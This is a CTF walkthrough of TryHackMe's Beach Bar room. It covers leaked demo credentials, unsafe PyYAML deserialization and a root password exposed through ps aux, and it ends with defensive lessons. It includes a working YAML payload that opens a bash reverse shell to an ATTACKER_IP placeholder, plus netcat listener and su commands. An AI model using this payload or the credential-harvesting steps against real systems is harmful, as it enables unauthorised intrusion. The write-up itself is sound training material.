---
title: Beach Bar - TryHackMe Writeup
published: 2026-08-01
description: Insecure YAML deserialization, leaked demo creds, and a root password sitting in ps aux — solving TryHackMe's Beach Bar room from Hacker Holidays.
image: ./cover.jpg
tags: [TryHackMe, CTF, Web Exploitation, Linux, Privilege Escalation]
category: Writeups
draft: false
---

> **Note:** This post was drafted with AI assistance (Claude) — I fed it my actual terminal history and screenshots from the room and had it write up the walkthrough in prose. The exploitation, commands, and screenshots are all mine; the write-up phrasing isn't hand-typed. Flagging this so readers know what they're reading.

> Spoiler warning: this walkthrough covers the full solve path for [Beach Bar](https://tryhackme.com/room/hh-beachbar-d849f7f7) (Hacker Holidays series, TryHackMe). Flags are masked.

## TL;DR

A jukebox web app leaks demo credentials in an HTML comment, accepts YAML playlist imports without a safe loader, and a root-owned background process leaks its own password on the command line. Chain those three and it's game over.

## Recon

Standard sweep first:

```bash
nikto -h http://<target-ip>
```

Confirmed a Gunicorn-backed Flask app redirecting `/` → `/login`. Nothing unusual in the nikto output beyond the missing `X-Frame-Options` header.

## Step 1 — Finding Credentials

Viewing the page source on the login form turned up an HTML comment left in from testing:

```
Username: dj
Password: dj
```

Logging in with `dj:dj` dropped straight into the jukebox dashboard — current playlist, plus **Import** and **Export** functions.

## Step 2 — Unsafe YAML Deserialization

The Import page takes a YAML playlist, either pasted or uploaded, and renders back a parsed Python object representation. That's the tell — the backend isn't just storing the text, it's deserializing it.

A peek at the source (`app.py`, grabbed later once I had a shell) confirmed the root cause:

```python
parsed = yaml.load(content, Loader=yaml.Loader)
```

`yaml.Loader` (instead of `yaml.SafeLoader` / `yaml.safe_load()`) happily constructs arbitrary Python objects from tags like `!!python/object/apply`. That's remote code execution by design.

Payload used to get a reverse shell:

```yaml
playlist:
  name: !!python/object/apply:os.system
    args: ["bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1'"]
```

Listener:

```bash
nc -lvnp 9001
```

Submitting the playlist via "Load playlist" triggered the callback — shell as `bartender`.

## Step 3 — User Flag

```bash
cat /home/bartender/user.txt
# THM{y************************h}
```

## Step 4 — Privilege Escalation

`ps aux` turned up a root-owned process:

```
root  606  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

Classic mistake: passing a secret as a command-line argument. Process args are visible to any local user via `ps` (and `/proc/<pid>/cmdline`), so the "internal" stream password for the jukebox daemon was sitting in plain view — and it turned out to be reused as the root account password.

```bash
su root
# Password: SunsetSpritz2024!
cat /root/root.txt
# THM{c****************************r}
```

Root.

## Root Cause Summary

```
HTML comment leaks demo creds
        ↓
Authenticated playlist importer
        ↓
yaml.Loader (unsafe) on user-controlled input
        ↓
RCE as bartender
        ↓
Root-owned process leaks password via ps aux
        ↓
Credential reuse → root
```

## Lessons

- Always check page source / comments before brute-forcing or guessing creds.
- Never ship demo/test credentials, even "hidden" in comments.
- `yaml.load()` with the default `Loader` is not safe for untrusted input — use `yaml.safe_load()`.
- Don't pass secrets as CLI args — they're visible via `ps aux` and `/proc/<pid>/cmdline` to any local user. Use env vars (still imperfect) or a secrets file with tight permissions instead.
- Don't reuse service passwords as the root password.
